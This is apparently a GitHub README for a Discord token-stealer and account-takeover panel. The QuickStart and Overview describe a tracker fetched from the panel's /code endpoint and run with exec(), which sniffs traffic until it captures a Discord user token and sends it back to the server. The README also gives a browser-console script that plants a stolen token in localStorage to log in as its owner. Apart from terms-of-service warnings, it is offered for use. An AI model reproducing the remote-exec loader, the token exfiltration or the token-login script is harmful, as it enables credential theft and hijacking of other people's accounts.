# Discord-Account-Tracker

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54)
![Postgres](https://img.shields.io/badge/postgres-%23316192.svg?style=for-the-badge&logo=postgresql&logoColor=white)
![HTML5](https://img.shields.io/badge/html5-%23E34F26.svg?style=for-the-badge&logo=html5&logoColor=white)
![CSS3](https://img.shields.io/badge/css3-%231572B6.svg?style=for-the-badge&logo=css3&logoColor=white)
![JavaScript](https://img.shields.io/badge/javascript-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)
![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Vercel](https://img.shields.io/badge/vercel-%23000000.svg?style=for-the-badge&logo=vercel&logoColor=white)

---

## QuickStart

1. Create a environment variable file .

`/flask/app/.env`
```
TOKEN = your token
CLIENT_ID = your client id
CLIENT_SECRET = your client secret
REDIRECT_URI = http://localhost:8080/oauth/callback
ADMIN_ID = your discord account id
```

2. Enter the commands in the shell.

Run with python
```shell=
pip install -r requirements.txt
python main.py
```

Run with docker
```shell=
docker compose up
```

> You can also running on [Vercel](https://vercel.com/).\
> If running on vercel, set `/flask` as the root directory.

---

## Overview
`/` The home page with user list, it gets user data from tracker.
 ![home](https://imgur.com/89k6VHQ.png) 
 - Click the script button to copy the javascript code to your clipboard.
 - Click the token button to copy the user token to your clipboard.
 - Clink the button in the upper right corner to redirect to `discord.com`

Enter `discord.com` and press `F12` or `Ctrl+Shift+I` to open the console.

Paste the scripts in the console (you can copy it in the home page).
```javascript=
function login(token) {setInterval(() => {document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token = `'${token}'`;}, 50);setTimeout(() => { location.reload(); }, 2500);}
```
Than you can login with this function.
```javascript=
login("token")
``` 

> [!WARNING]
> **Login with user token may be in violation of Discord Terms of Service**

---

`/login`, `/logout` The discord account login system.

`/code` The tracker code.

Can be used in the following situations
```python=
import json
import request
URL = "your url"

code = json.loads(request.get(f"{URL}/code").text)
exec(code)
```

`/code/download` Download the tracker code.

you can use the commands after downloading.
```shell=
pip install request
pip install pyshark
python shell.py
```

The tracker will running until get the discord user token and return to the URL, you can ckeck the data in the home page.

> [!WARNING]
> **The tracker may be in violation of Discord Terms of Service**

## Support
<table>
    <tr>
        <th>Platform</th>
        <th>Website Supported</th>
        <th>Tracker Supported</th>
    </tr>
    <tr>
        <th>Windows</th>
        <th style="text-align: center">✅</th>
        <th style="text-align: center">✅</th>
    </tr>
    <tr>
        <th>Linux</th>
        <th style="text-align: center">✅</th>
        <th style="text-align: center">❌</th>
    </tr>
    <tr>
        <th>Mac</th>
        <th style="text-align: center">✅</th>
        <th style="text-align: center">❌</th>
    </tr>
</table>